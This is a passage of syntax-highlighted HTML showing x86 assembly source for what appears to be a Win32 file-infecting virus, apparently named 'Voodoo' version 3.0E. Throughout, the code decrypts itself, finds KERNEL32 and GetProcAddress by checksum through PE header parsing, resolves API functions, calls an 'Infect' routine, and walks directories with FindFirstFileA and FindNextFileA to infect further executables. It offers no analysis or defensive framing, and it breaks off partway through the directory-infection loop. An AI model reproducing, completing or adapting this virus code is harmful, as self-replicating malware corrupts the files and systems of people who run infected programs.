       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Voodoo_Ver_3_0E</span><span class="sc0">
</span><span class="sc5">k2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">@INCAX2</span><span class="sc4">:</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0"> </span><span class="sc1">;add ax,cx</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">crypt2</span><span class="sc0">
</span><span class="sc5">CryptBegin2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;----------------------</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_ESI</span><span class="sc0">
</span><span class="sc5">_ESI</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">ScanMZ</span><span class="sc0">
   </span><span class="sc1">; in esi PE header</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;Import RVA</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@L1</span><span class="sc0">
</span><span class="sc5">NotKERNEL32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc8">EBP</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">00014h</span><span class="sc0">
</span><span class="sc5">@L1</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc2">000000h</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">NOtFound</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;RVA NAme  of dll</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRCSum</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CheckSum</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NotKERNEL32</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;KERNEL32 proc</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc2">0e9h</span><span class="sc0">   </span><span class="sc1">; win98</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Ok_</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Ok_</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ScanMZ</span><span class="sc0">
   </span><span class="sc1">;push EBP ;Hendle of KERNEL32.dll</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; edi=Export Directory Table RVA</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Address Table</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Ordinal Table</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;ebx=Name Pointers RVA</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">@Name_Pointers_RVA</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Num of Name Pointers</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">@L2</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ScanNameTable</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CheckSum2</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">FoundGetProcAdr</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@L2</span><span class="sc0">
</span><span class="sc5">FoundGetProcAdr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; #function</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; x2</span><span class="sc0">
    </span><span class="sc1">; Ordinal Table</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Ordinal of GetProcAddress</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">;x4</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">;entry</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc1">; offset to Address Table</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@GetProcAddress</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@KernelHandle</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">GlobalAllocCRC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">CalkProcAdress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@_GlobalAlloc</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">GlobalLockCRC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">CalkProcAdress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@_GlobalLock</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MemSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@_GlobalAlloc</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@_GlobalLock</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@MemPointer</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eBX</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">@ImportTable</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">MakeImport</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CalkProcAdress</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">6666h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">MakeImport</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">; entry !</span><span class="sc0">
    </span><span class="sc1">;--------------------</span><span class="sc0">

    </span><span class="sc1">;####################</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Infect</span><span class="sc0">
    </span><span class="sc1">;####################</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">CODEBUF</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">;MemPointer</span><span class="sc0">
          </span><span class="sc6">cld</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">VirSize</span><span class="sc0">
          </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc5">NOtFound</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">flag</span><span class="sc4">],</span><span class="sc2">12345678h</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Ret2Prog</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">
</span><span class="sc5">Ret2Prog</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OldEBP</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">@NextCode</span><span class="sc4">+</span><span class="sc5">CODEBUF</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc5">CODEBUF</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">NextCode</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetCommandLineA</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">':'</span><span class="sc0"> </span><span class="sc1">;for win9x</span><span class="sc0">
          </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">NormalCommandLine</span><span class="sc0">
          </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">NormalCommandLine</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CommandLine</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lstrcpyA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">CommandLine</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">@L3</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@L3</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_ARCHIVE</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0"> </span><span class="sc1">;or FILE_SHARE_WRITE</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc1">;or GENERIC_WRITE</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HhendleOfFile</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">VirSize</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetFilePointer</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">OldEBP</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NumberOfBytesRead</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">VirSize</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ReadFile</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_EDI</span><span class="sc0">
</span><span class="sc5">EntryPointRVA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_EDI</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">PushWin32FindData</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Win32FindData</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">InfectDir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CurDir2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">800</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCurrentDirectory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infect_All_files</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PushWin32FindData</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@Dirmask</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindFirstFileA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SearcHandle</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc5">l2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PushWin32FindData</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SearcHandle</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindNextFileA</span><span class="sc0">
